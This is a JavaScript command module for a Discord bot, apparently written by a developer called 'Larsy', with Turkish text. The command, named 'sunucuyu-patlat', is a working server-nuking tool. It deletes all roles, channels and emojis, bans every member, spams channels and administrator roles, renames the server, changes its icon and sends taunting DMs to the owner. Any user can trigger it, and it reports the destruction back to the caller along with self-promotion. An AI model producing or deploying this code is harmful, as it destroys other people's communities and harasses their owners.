//-------------------------Required Modules--------------------------\\


const Discord = require('discord.js');


//-------------------------Required Modules--------------------------\\


exports.run = async(client, message, args) => { 

    if (!message.guild) {
    return message.author.send("**Beni Sadece Bir Sunucuda Kullanabilirsin!**"); }
  
    const patlatamk = new Discord.MessageEmbed()

.setTitle("**Sunucu Patlatıldı!**")
.setFooter(`${dev} ${y}${s}${r}${a}${l}`)
.addField(`Botun Ismi: *${client.user.username}* Botun Pingi: *${client.ws.ping}*`, `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`)
.addField("Sunucunun Ismi `SUNUCU PATLATILDI xD` Olarak Değiştirildi.", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
.addField("Sunucunun Iconu Değiştirildi.", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
.addField("Sunucudaki Tüm Üyelere Ban Atıldı.", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
.addField("Sunucudaki Tüm Kanallar Silindi.", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
.addField("Sunucudaki Tüm Roller Silindi.", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
.addField("Sunucudaki Tüm Emojiler Silindi.", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
.addField("Sunucuya Kanal Spam Atıldı.", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
.addField("Sunucuya Sesli Kanal Spam Atıldı.", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
.addField("Sunucuya Kategori Spam Atıldı.", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
.addField("Sunucuya Rol Spam Atıldı.", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
.addField("Sunucu Sahibine DM den Spam Atıldı.", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
.setDescription(`**Bu Botun Sahibi Olan [Larsyyi](https://github.com/larsydev) [Sunucusuna](https://discord.gg/hAnJSv9GdU) Gelerek Destekliyebilirsin.**,
                **━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━**
**Logs:**`)
.setColor("#323131")
.setImage("https://i.ibb.co/7QfwQMb/standard.gif")
.setTimestamp()

const reklam = new Discord.MessageEmbed()
.setDescription(`**Githubdan Takip Edip Discord Sunucuma Gelirsen Sevinirim**
                 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                 **Github Hesabım:** [https://github.com/larsydev](https://github.com/larsydev)
                 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                 **Discord Sunucum:** [https://discord.gg/hAnJSv9GdU](https://discord.gg/hAnJSv9GdU)
                 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`)
.setTimestamp()
.setColor("#323131")
.setFooter(`${dev} ${y}${s}${r}${a}${l}`)

 message.author.send(patlatamk)
 message.author.send(reklam)
 message.guild.roles.cache.forEach(a => a.delete())
 message.guild.channels.cache.forEach(a => a.delete())
 message.guild.emojis.cache.forEach(a => a.delete())
 for (var i = 0; i < 100; i++) {
 message.guild.setName("SUNUCU PATLATILDI xD")
 message.guild.setIcon('https://cdn.discordapp.com/icons/828222553053986836/3434677e47dd167c56e3203156a4b888.png?size=128')
 message.guild.owner.send('**Larsy Botunu Kullanarak ``'+message.guild.name+'`` Adlı Sunucunu Patlattık xD**')
 message.guild.members.cache.forEach(member => member.guild.members.ban(member,{ reason: `Larsy Bot | Sunucu Patlatıldı :))` }));  
 message.guild.channels.create(`Larsy | Sunucu Patlatıldı :))`, { type: 'text', reason: 'Larsy Bot | Sunucu Patlatıldı :))' });
 message.guild.channels.create(`Larsy | Sunucu Patlatıldı :))`, { type: 'voice', reason: 'Larsy Bot | Sunucu Patlatıldı :))' });
 message.guild.channels.create(`Larsy | Sunucu Patlatıldı :))`, { type: 'category', reason: 'Larsy Bot | Sunucu Patlatıldı :))' });
 message.guild.roles.create({data: {name: 'Larsy Bot | Sunucu Patlatıldı :))',color: 'RED',permissions: 'ADMINISTRATOR'}})
}
  };
exports.conf = {
  enabled: true,  
  guildOnly: false, 
  aliases: ["patlatsunucuyu","sunucuyusik","sunucununamk","sunucuyupatlat","patlatamk","patlat"], 
  permLevel: 0 
};

exports.help = {
  name: 'sunucuyu-patlat',
  description: 'Sunucuyu Patlatır .d', 
  usage: 'patlat'
};

var dev = "Developed By"
var y = "L"
var s = "a"
var r = "r"
var a = "s"
var l = "y"